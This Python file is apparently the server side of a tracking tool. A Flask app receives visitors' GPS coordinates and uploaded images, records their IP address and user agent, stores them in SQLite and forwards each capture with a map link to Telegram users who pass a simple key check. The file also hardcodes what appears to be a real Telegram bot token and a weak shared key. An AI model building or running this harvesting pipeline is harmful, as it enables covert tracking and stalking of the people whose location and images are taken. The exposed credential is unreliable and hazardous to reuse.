import os
import sqlite3
import threading
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import asyncio

# -------------------- Flask Setup --------------------
app = Flask(__name__)

# -------------------- Folder Setup --------------------
SAVE_FOLDER = "saved_files"
os.makedirs(SAVE_FOLDER, exist_ok=True)

# -------------------- Database Setup --------------------
def init_db():
    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS osint_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  type TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  file_path TEXT)''')
    conn.commit()
    conn.close()

init_db()

# -------------------- Telegram Bot Setup --------------------
TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"  # Replace with your actual bot token
AUTHORIZED_KEY = "secretkey123"
RENDER_WEBHOOK_URL = "https://tele-track-syk8.onrender.com/webhook"# Your auth key for users
authenticated_users = set()

def send_telegram_message(message):
    for user_id in authenticated_users:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": user_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, data=data)

def send_telegram_image(image_path, caption=""):
    for user_id in authenticated_users:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(image_path, "rb") as photo:
            files = {"photo": photo}
            data = {"chat_id": user_id, "caption": caption}
            requests.post(url, files=files, data=data)

# Telegram Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 Please authenticate using /auth <key>")
        return
    await update.message.reply_text("✅ Server is live and bot is running!")

async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /auth <key>")
        return
    if context.args[0] == AUTHORIZED_KEY:
        authenticated_users.add(user_id)
        await update.message.reply_text("🔑 Authenticated successfully!")
    else:
        await update.message.reply_text("❌ Invalid key!")

async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")

async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 You are not authenticated.")
        return

    deleted_files = 0
    for file in os.listdir(SAVE_FOLDER):
        file_path = os.path.join(SAVE_FOLDER, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
            deleted_files += 1

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("DELETE FROM osint_data")
    conn.commit()
    conn.close()

    await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")

def run_bot():
    try:
        # Create and set a new event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("auth", auth))
        application.add_handler(CommandHandler("chatid", chatid))
        application.add_handler(CommandHandler("delete", delete))

        # Run polling with the newly set event loop
        application.run_polling()
    except Exception as e:
        print(f"[❌] Bot failed to start: {e}")
        import traceback
        traceback.print_exc()

    application.run_polling()

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    # Serve your frontend page if you have one
    return send_file('static/index.html')

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    ip_address = request.remote_addr or "Unknown IP"
    user_agent = request.headers.get('User-Agent', 'Unknown User Agent')

    lat = data.get('latitude')
    lon = data.get('longitude')
    accuracy = data.get('accuracy', 'Unknown')

    # Save to DB
    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO osint_data (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', ("location", lat, lon, accuracy, datetime.utcnow().isoformat(), ip_address, user_agent))
    conn.commit()
    conn.close()

    # Prepare message for Telegram (vertical new lines and clickable map)
    message = (
        f"📍 *New Location Received:*\n"
        f"Latitude: `{lat}`\n"
        f"Longitude: `{lon}`\n"
        f"Accuracy: ±{accuracy} m\n"
        f"[📍 View on Map](https://www.google.com/maps?q={lat},{lon})\n"
        f"IP: `{ip_address}`\n"
        f"User Agent: `{user_agent}`"
    )

    # Send to Telegram
    send_telegram_message(message)

    # Print to console
    print(f"[Location] IP: {ip_address}, UA: {user_agent}, Coordinates: ({lat}, {lon}), Accuracy: {accuracy}")

    return jsonify({"status": "OK"}), 200

@app.route('/upload_image', methods=['POST'])
def upload_image():
    if 'image' not in request.files:
        return jsonify({"error": "No image uploaded"}), 400

    image_file = request.files['image']
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
    image_file.save(filename)

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO osint_data (type, file_path, timestamp)
        VALUES (?, ?, ?)
    ''', ("image", filename, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

    send_telegram_image(filename, caption="🖼️ New Image Uploaded")

    print(f"[Image] Saved and sent: {filename}")

    return jsonify({"status": "OK"}), 200

# -------------------- Main --------------------
if __name__ == '__main__':
    # Start Telegram bot polling in a separate thread
    threading.Thread(target=run_bot, daemon=True).start()

    # Start Flask app
    print("🚀 Starting Flask server on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
